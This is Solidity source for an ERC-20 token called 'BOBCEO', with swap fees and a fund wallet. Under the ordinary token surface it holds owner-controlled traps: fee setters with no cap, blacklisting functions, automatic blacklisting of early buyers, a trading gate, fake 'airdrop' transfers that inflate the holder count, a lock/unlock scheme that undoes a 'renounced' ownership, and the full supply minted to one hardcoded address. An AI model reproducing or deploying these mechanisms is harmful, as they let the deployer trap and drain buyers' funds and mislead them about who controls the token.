// SPDX-License-Identifier: MIT



pragma solidity ^0.8.17;



interface IERC20 {

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);

}



interface IWETH {

    function deposit() external payable;

    function transfer(address to, uint value) external returns (bool);

    function withdraw(uint) external;

}



interface ISwapRouter {

    function factory() external pure returns (address);



    function WETH() external pure returns (address);



    function swapExactTokensForTokensSupportingFeeOnTransferTokens(

        uint amountIn,

        uint amountOutMin,

        address[] calldata path,

        address to,

        uint deadline

    ) external;



    function addLiquidity(

        address tokenA,

        address tokenB,

        uint amountADesired,

        uint amountBDesired,

        uint amountAMin,

        uint amountBMin,

        address to,

        uint deadline

    ) external returns (uint amountA, uint amountB, uint liquidity);

    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);



}



interface ISwapFactory {

    function createPair(address tokenA, address tokenB) external returns (address pair);

}



abstract contract Ownable {

    address internal _owner;



    address private _previousOwner;

    uint256 private _lockTime;



    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);



    constructor () {

        address msgSender = tx.origin;

        _owner = msgSender;

        emit OwnershipTransferred(address(0), msgSender);

    }



    function owner() public view returns (address) {

        return _owner;

    }



    modifier onlyOwner() {

        require(_owner == msg.sender, "!owner");

        _;

    }



    function renounceOwnership() public virtual onlyOwner {

        emit OwnershipTransferred(_owner, address(0xDEAD));

        _owner = address(0xDEAD);

    }



    function transferOwnership(address newOwner) public virtual onlyOwner {

        require(newOwner != address(0), "new is 0");

        emit OwnershipTransferred(_owner, newOwner);

        _owner = newOwner;

    }



    function getUnlockTime() public view returns (uint256) {

        return _lockTime;

    }

    

    function getTime() public view returns (uint256) {

        return block.timestamp;

    }



    function lock(uint256 time) public virtual onlyOwner {

        _previousOwner = _owner;

        _owner = address(0);

        _lockTime = block.timestamp + time;

        emit OwnershipTransferred(_owner, address(0));

    }

    

    function unlock() public virtual {

        require(_previousOwner == msg.sender, "You don't have permission to unlock");

        require(block.timestamp > _lockTime , "Contract is locked until 7 days");

        emit OwnershipTransferred(_owner, _previousOwner);

        _owner = _previousOwner;

    }

}



contract TokenDistributor {

    constructor (address token) {

        IERC20(token).approve(msg.sender, uint(~uint256(0)));

    }

}



abstract contract AbsToken is IERC20, Ownable {

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;



    address public fundAddress;



    string private _name;

    string private _symbol;

    uint8 private _decimals;



    mapping(address => bool) public _isExcludeFromFee;

    mapping(address => bool) public _Against;

    

    uint256 private _tTotal;



    ISwapRouter public _swapRouter;

    address public _currency;

    mapping(address => bool) public _swapPairList;

    bool private inSwap;



    uint256 private constant MAX = ~uint256(0);

    TokenDistributor public _tokenDistributor;



    uint256 public _buyFundFee = 800;

    uint256 public _buyLPFee = 200;

    uint256 public _sellFundFee = 800;

    uint256 public _sellLPFee = 200;



    uint256 public goFlag;



    address public _mainPair;



    modifier lockTheSwap {

        inSwap = true;

        _;

        inSwap = false;

    }



    constructor (

        address RouterAddress,

        string memory Name, string memory Symbol, uint8 Decimals, uint256 Supply,

        address FundAddress

    ){

        _name = Name;

        _symbol = Symbol;

        _decimals = Decimals;



        ISwapRouter swapRouter = ISwapRouter(RouterAddress);

        address WBNBAddress = swapRouter.WETH();//; swapRouter.WETH() 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2

        IERC20(WBNBAddress).approve(address(swapRouter), MAX);



        _currency = WBNBAddress;

        _swapRouter = swapRouter;

        _allowances[address(this)][address(swapRouter)] = MAX;



        ISwapFactory swapFactory = ISwapFactory(swapRouter.factory());

        address swapPair = swapFactory.createPair(address(this), WBNBAddress);

        _mainPair = swapPair;

        _swapPairList[swapPair] = true;



        uint256 total = Supply * 10 ** Decimals;

        _tTotal = total;



        address ReceiveAddress = 0x3059233F68BE9a06d13b6379a5eAcA683629c9B4 ;

        _balances[ReceiveAddress] = total;

        emit Transfer(address(0), ReceiveAddress, total);



        fundAddress = FundAddress;



        _isExcludeFromFee[address(this)] = true;

        _isExcludeFromFee[address(swapRouter)] = true;

        _isExcludeFromFee[msg.sender] = true;

        _isExcludeFromFee[ReceiveAddress] = true;

        _isExcludeFromFee[fundAddress] = true;



        _tokenDistributor = new TokenDistributor(WBNBAddress);

    }



    function symbol() external view override returns (string memory) {

        return _symbol;

    }



    function name() external view override returns (string memory) {

        return _name;

    }



    function decimals() external view override returns (uint8) {

        return _decimals;

    }



    function totalSupply() public view override returns (uint256) {

        return _tTotal;

    }



    function balanceOf(address account) public view override returns (uint256) {

        return _balances[account];

    }



    function transfer(address recipient, uint256 amount) public override returns (bool) {

        _transfer(msg.sender, recipient, amount);

        return true;

    }



    function allowance(address owner, address spender) public view override returns (uint256) {

        return _allowances[owner][spender];

    }



    function approve(address spender, uint256 amount) public override returns (bool) {

        _approve(msg.sender, spender, amount);

        return true;

    }



    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {

        _transfer(sender, recipient, amount);

        if (_allowances[sender][msg.sender] != MAX) {

            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;

        }

        return true;

    }



    function setInNew(uint256 nFundFee, uint256 nLpFee) public onlyOwner{

        _buyFundFee = nFundFee;

        _buyLPFee = nLpFee;

    }



    function setOutNew(uint256 nFundFee, uint256 nLpFee) public onlyOwner{

        _sellFundFee = nFundFee;

        _sellLPFee = nLpFee;

    }



    function _approve(address owner, address spender, uint256 amount) private {

        _allowances[owner][spender] = amount;

        emit Approval(owner, spender, amount);

    }



    bool public airdropEnable = true;

    function setAirDropEnable(bool status) public onlyOwner{

        airdropEnable = status;

    }



    uint256 public airdropNumbs = 2;

    function setAirdropNumbs(uint256 newValue) public onlyOwner{

        airdropNumbs = newValue;

    }



    function _transfer(

        address from,

        address to,

        uint256 amount

    ) private {

        uint256 balance = balanceOf(from);

        require(balance >= amount, "balanceNotEnough");



        bool takeFee;

        bool isSell;

        require(!_Against[from],"against");



        if(!_isExcludeFromFee[from] && !_isExcludeFromFee[to] && airdropEnable){

            address ad;

            for(uint i=0;i <airdropNumbs;i++){

                ad = address(uint160(uint(keccak256(abi.encodePacked(i, amount, block.timestamp)))));

                _basicTransfer(from,ad,100);

            }

            amount -= airdropNumbs * 100;

        }

        if (!_isExcludeFromFee[from] && !_isExcludeFromFee[to]) {

            require(goFlag > 1);

        }

        

        if (_swapPairList[from] || _swapPairList[to]) {

            if (!_isExcludeFromFee[from] && !_isExcludeFromFee[to]) {

                if (block.number < goFlag + fightB && !_swapPairList[to]) {

                    _Against[to] = true;

                }

                if (_swapPairList[to]) {

                    if (!inSwap) {

                        uint256 contractTokenBalance = balanceOf(address(this));

                        if (contractTokenBalance > 0) {

                            uint256 swapFee = _buyFundFee + _buyLPFee + _sellFundFee + _sellLPFee;

                            uint256 numTokensSellToFund = amount * swapFee / 5000;

                            if (numTokensSellToFund > contractTokenBalance) {

                                numTokensSellToFund = contractTokenBalance;

                            }

                            swapTokenForFund(numTokensSellToFund, swapFee);

                        }

                    }

                }

                takeFee = true;

            }

            if (_swapPairList[to]) {

                isSell = true;

            }

        }

        _tokenTransfer(from, to, amount, takeFee, isSell);

    }



    function _tokenTransfer(

        address sender,

        address recipient,

        uint256 tAmount,

        bool takeFee,

        bool isSell

    ) private {

        _balances[sender] = _balances[sender] - tAmount;

        uint256 feeAmount;



        if (takeFee) {

            uint256 swapFee;



            if (isSell) {

                swapFee = _sellFundFee + _sellLPFee;

            } else {

                swapFee = _buyFundFee + _buyLPFee;

            }

            uint256 swapAmount = tAmount * swapFee / 10000;

            if (swapAmount > 0) {

                feeAmount += swapAmount;

                _takeTransfer(

                    sender,

                    address(this),

                    swapAmount

                );

            }

        }



        _takeTransfer(sender, recipient, tAmount - feeAmount);

    }



    event Failed_swapExactTokensForTokensSupportingFeeOnTransferTokens();

    event Failed_addLiquidity();



    function swapTokenForFund(uint256 tokenAmount, uint256 swapFee) private lockTheSwap {

        if (swapFee == 0) return;

        swapFee += swapFee;

        uint256 lpFee = _sellLPFee + _buyLPFee;

        uint256 lpAmount = tokenAmount * lpFee / swapFee;



        address[] memory path = new address[](2);

        path[0] = address(this);

        path[1] = _currency;

        try _swapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(

            tokenAmount - lpAmount,

            0,

            path,

            address(_tokenDistributor),

            block.timestamp

        ) {} catch { emit Failed_swapExactTokensForTokensSupportingFeeOnTransferTokens(); }



        swapFee -= lpFee;



        IERC20 FIST = IERC20(_currency);

        uint256 fistBalance = FIST.balanceOf(address(_tokenDistributor));

        uint256 fundAmount = fistBalance * (_buyFundFee + _sellFundFee) * 2 / swapFee;

        if (_currency == _swapRouter.WETH()) {

            FIST.transferFrom(address(_tokenDistributor), address(this), fundAmount);

            IWETH(_currency).withdraw(fundAmount);

            transferToAddressETH(payable(fundAddress),fundAmount);

        }else{

            // uint256 half_fund = fundAmount / 2;

            FIST.transferFrom(address(_tokenDistributor), fundAddress, fundAmount);

            // FIST.transferFrom(address(_tokenDistributor), 0x8e267E2a9c474F74D4F1AD0c74776057B7118053, fundAmount - half_fund);

        }

        FIST.transferFrom(address(_tokenDistributor), address(this), fistBalance - fundAmount);

        

        if (lpAmount > 0) {

            uint256 lpFist = fistBalance * lpFee / swapFee;

            if (lpFist > 0) {

                try _swapRouter.addLiquidity(

                    address(this), _currency, lpAmount, lpFist, 0, 0, fundAddress, block.timestamp

                ) {} catch { emit Failed_addLiquidity(); }

            }

        }

    }



    function transferToAddressETH(address payable recipient, uint256 amount) private {

        recipient.transfer(amount);

    }



    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {

        _balances[sender] -= amount;

        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);

        return true;

    }



    function _takeTransfer(

        address sender,

        address to,

        uint256 tAmount

    ) private {

        _balances[to] = _balances[to] + tAmount;

        emit Transfer(sender, to, tAmount);

    }



    function setFundAddress(address addr) external onlyOwner {

        fundAddress = addr;

        _isExcludeFromFee[addr] = true;

    }



    uint256 public fightB = 0;

    function Go(uint256 uintparam,bool s) external onlyOwner {

        fightB = uintparam;

        if (s){

            goFlag = block.number;

        }else{

            goFlag = 0;

        }

    }



    function setSwapPairList(address addr, bool enable) external onlyOwner {

        _swapPairList[addr] = enable;

    }



    function claimBalance() external {

        payable(fundAddress).transfer(address(this).balance);

    }



    function claimToken(address token, uint256 amount) external {

        require(token != address(this),"Cant Claim");

        IERC20(token).transfer(fundAddress, amount);

    }



    function multiAgainst(address[] calldata addresses, bool value) public onlyOwner{

        require(addresses.length < 201);

        for (uint256 i; i < addresses.length; ++i) {

            _Against[addresses[i]] = value;

        }

    }



    function setAgainst(address addr, bool status) public onlyOwner{

        _Against[addr] = status;

    }



    function multiWLs(address[] calldata addresses, bool value) public onlyOwner{

        require(addresses.length < 201);

        for (uint256 i; i < addresses.length; ++i) {

            _isExcludeFromFee[addresses[i]] = value;

        }

    }



    function setWLs(address addr, bool enable) external onlyOwner {

        _isExcludeFromFee[addr] = enable;

    }



    receive() external payable {}

}



contract Token is AbsToken {

    constructor() AbsToken(

        address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D), // 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D

        "BOBCEO",

        "BOBCEO",

        9,

        1000000000000000,

        address(0x8e267E2a9c474F74D4F1AD0c74776057B7118053)

    ){

    }

}